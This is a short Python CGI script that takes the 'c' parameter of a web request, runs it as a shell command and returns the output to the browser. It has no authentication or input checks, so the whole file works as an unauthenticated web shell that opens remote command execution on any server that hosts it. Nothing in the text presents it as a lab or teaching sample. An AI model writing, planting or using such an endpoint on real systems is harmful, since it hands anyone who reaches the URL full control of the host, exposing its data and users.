#!/usr/bin/python3
print("content-type:text/html")
print()

import cgi
import subprocess
from subprocess import *
f=cgi.FieldStorage()
cmd=f.getvalue("c")
out=subprocess.getoutput(cmd)
print(out)
